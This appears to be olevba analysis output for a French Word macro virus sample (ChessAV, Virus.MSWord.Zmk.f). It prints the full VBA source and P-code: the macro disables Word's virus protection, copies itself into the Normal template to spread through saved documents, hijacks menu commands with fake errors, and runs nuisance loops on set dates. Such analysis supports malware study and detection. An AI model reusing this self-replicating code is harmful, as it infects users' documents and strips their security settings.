olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ChessAV.bas 
in file: Virus.MSWord.Zmk.f - OLE stream: 'Macros/VBA/ChessAV'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
If D$ = "15" Then
Scroll:
    MsgBox "Attention, Je vais vous ennuyer", vbInformation, "Virus ChessAV"
    ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled + 40
    ActiveWindow.VerticalPercentScrolled = ActiveWindow.VerticalPercentScrolled - 40
GoTo Scroll
End If
If D$ = "01" Then
Message
    StatusBar = "Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
    StatusBar = "                                                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
    For i = 1 To 500000
GoTo Message
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "ChessAV" Then
        ChessAVInstalled = -1
    End If
Next i
If Not ChessAVInstalled Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ChessAV", Object:=wdOrganizerObjectProjectItems
    MsgBox "Vous n'êtes plus à l'abri des macros virus avec ce format..." & Chr$(13) & "HAHAHAHAHA!!!", vbCritical, "Virus ChessAV"
    MsgBox "ZeMacroKiller98 a trouvé la solution...", vbCritical, "Virus ChessAV"
End If
ErrorFO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatRTF Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ChessAV", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    Selection.EndKey
    Selection.TypeParagraph
    Selection.TypeText Text:="Vive les virus de macro!!!!!"
    Selection.TypeParagraph
    Selection.TypeText Text:="ZeMacroKiller98 est le meilleur!!!!"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
Assistant.Visible = True
    With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Microsoft Word"
    .Text = "Microsoft Visual Basic Editor n'est pas Installé" & Chr$(13) & "Veuillez consulter l'aide en ligne"
    .Show
End With
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zmk.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/ChessAV - 12688 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAE 
' Line #6:
' 	Dim 
' 	VarDefn MyDate
' Line #7:
' 	Ld Date 
' 	St MyDate 
' Line #8:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #9:
' 	Ld D$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Label Scroll 
' Line #11:
' 	LitStr 0x001F "Attention, Je vais vous ennuyer"
' 	Ld vbInformation 
' 	LitStr 0x000D "Virus ChessAV"
' 	ArgsCall MsgBox 0x0003 
' Line #12:
' 	Ld ActiveWindow 
' 	MemLd VerticalPercentScrolled 
' 	LitDI2 0x0028 
' 	Add 
' 	Ld ActiveWindow 
' 	MemSt VerticalPercentScrolled 
' Line #13:
' 	Ld ActiveWindow 
' 	MemLd VerticalPercentScrolled 
' 	LitDI2 0x0028 
' 	Sub 
' 	Ld ActiveWindow 
' 	MemSt VerticalPercentScrolled 
' Line #14:
' 	GoTo Scroll 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld D$ 
' 	LitStr 0x0002 "01"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	ArgsCall Message 0x0000 
' Line #18:
' 	LitStr 0x0032 "Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #20:
' 	LitStr 0x0039 "       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #22:
' 	LitStr 0x0041 "               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #24:
' 	LitStr 0x0049 "                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #26:
' 	LitStr 0x0051 "                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #28:
' 	LitStr 0x0059 "                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #30:
' 	LitStr 0x0061 "                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #32:
' 	LitStr 0x0069 "                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #34:
' 	LitStr 0x0071 "                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #35:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #36:
' 	LitStr 0x0079 "                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #38:
' 	LitStr 0x0082 "                                                                                Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #40:
' 	LitStr 0x0089 "                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #42:
' 	LitStr 0x0091 "                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #44:
' 	LitStr 0x0099 "                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #46:
' 	LitStr 0x00A1 "                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #47:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #48:
' 	LitStr 0x00A9 "                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #49:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #50:
' 	LitStr 0x00B1 "                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #51:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #52:
' 	LitStr 0x00B9 "                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #54:
' 	LitStr 0x00C1 "                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #56:
' 	LitStr 0x00C9 "                                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #58:
' 	LitStr 0x00D1 "                                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #59:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #60:
' 	LitStr 0x00D9 "                                                                                                                                                                       Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #62:
' 	LitStr 0x00E1 "                                                                                                                                                                               Attention, ChessAV vous a infecté, HAHAHAHAHA!!!!!"
' 	St StatusBar 
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xA120 0x0007 
' 	For 
' Line #64:
' 	GoTo Message 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Label ErrorAE 
' Line #67:
' 	EndSub 
' Line #68:
' 	FuncDefn (Sub AutoOpen())
' Line #69:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #70:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #71:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #72:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #73:
' 	OnError ErrorFO 
' Line #74:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #75:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #76:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0007 "ChessAV"
' 	Eq 
' 	IfBlock 
' Line #77:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ChessAVInstalled 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' 	Ld ChessAVInstalled 
' 	Not 
' 	IfBlock 
' Line #81:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "ChessAV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #82:
' 	LitStr 0x003C "Vous n'êtes plus à l'abri des macros virus avec ce format..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000D "HAHAHAHAHA!!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus ChessAV"
' 	ArgsCall MsgBox 0x0003 
' Line #83:
' 	LitStr 0x0027 "ZeMacroKiller98 a trouvé la solution..."
' 	Ld vbCritical 
' 	LitStr 0x000D "Virus ChessAV"
' 	ArgsCall MsgBox 0x0003 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	Label ErrorFO 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub FileSaveAs())
' Line #88:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #89:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #90:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #92:
' 	OnError ErrorFSA 
' Line #93:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #94:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatRTF 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #95:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "ChessAV"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #98:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #99:
' 	Label ErrorFSA 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub FileTemplates())
' Line #102:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #103:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #104:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #105:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #106:
' 	OnError ErrorFT 
' Line #107:
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0000 
' Line #108:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #109:
' 	LitStr 0x001C "Vive les virus de macro!!!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #110:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #111:
' 	LitStr 0x0023 "ZeMacroKiller98 est le meilleur!!!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #112:
' 	Label ErrorFT 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub ToolsMacro())
' Line #115:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #116:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #117:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #118:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #119:
' 	OnError ErrorTM 
' Line #120:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #121:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #122:
' 	Ld msoButtonSetOK 
' 	MemStWith Button 
' Line #123:
' 	LitStr 0x000E "Microsoft Word"
' 	MemStWith Heading 
' Line #124:
' 	LitStr 0x0030 "Microsoft Visual Basic Editor n'est pas Installé"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0022 "Veuillez consulter l'aide en ligne"
' 	Concat 
' 	MemStWith Then 
' Line #125:
' 	ArgsMemCallWith Show 0x0000 
' Line #126:
' 	EndWith 
' Line #127:
' 	Label ErrorTM 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub ViewVBCode())
' Line #130:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #131:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #132:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #133:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #134:
' 	OnError ErrorVVBC 
' Line #135:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #136:
' 	Label ErrorVVBC 
' Line #137:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

